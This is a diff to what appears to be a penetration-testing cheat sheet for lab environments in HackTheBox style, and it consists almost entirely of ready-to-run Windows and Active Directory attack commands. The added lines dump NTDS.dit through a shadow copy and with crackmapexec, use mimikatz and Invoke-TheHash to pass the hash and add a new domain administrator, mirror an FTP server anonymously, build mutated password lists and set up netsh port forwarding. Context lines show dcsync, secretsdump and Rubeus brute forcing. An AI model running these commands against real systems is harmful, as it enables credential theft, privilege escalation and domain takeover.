@@ -265,7 +265,7 @@ PS > Get-ChildItem Env: | ft Key,Value
 PS C:\htb> qwinsta
 ```
 ```
--- RDP DisableRestrictedAdmin
+-- RDP DisableRestrictedAdminMode  
 
 C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
@@ -466,6 +466,34 @@ PS > .\Rubeus.exe brute /users:usernames.txt /passwords:pass.txt /domain:m0chanA
 
  mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
  ```
+
+
+```
+- Creating Shadow Copy of C:
+
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
+
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+```
+
+
+### Pass The Hash
+
+```
+- With Mimikatz
+
+c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
+```
+```
+-Using Invoke-TheHash
+
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+```
 ### Silver Ticket
 
 ```
@@ -951,6 +979,12 @@ $ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Kl
 --Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
 $ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
 ```
+
+```
+
+$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+
+```
 ### Kerberoasting
 ```
 -Find users with spn`s set
@@ -1092,6 +1126,10 @@ $ openssl s_client -connect x.x.x.x:21 -starttls ftp
 - FTP Bounce
 
 $ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+```
+```
+- Download all available files with wget
+$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
 ```
 
 ### IMAP
@@ -1566,5 +1604,28 @@ $ ./chisel client -v 10.10.14.17:1234 R:socks
 -Loading SocksOverRDP.dll using regsvr32.exe
 
 C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
+
+```
+
+
+### Password Mutations
+
+``` 
+$ ls /usr/share/hashcat/rules/
+
+$ hashcat --force password.list -r {rule} --stdout | sort -u > mut_password.list
+```
+
+
+```
+$ ./username-anarchy -i /home/ltnbob/names.txt 
+```
+
+### netsh.exe Windows Port Forwarding
+
+```
+-From the pivot
+
+C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
 
 ```
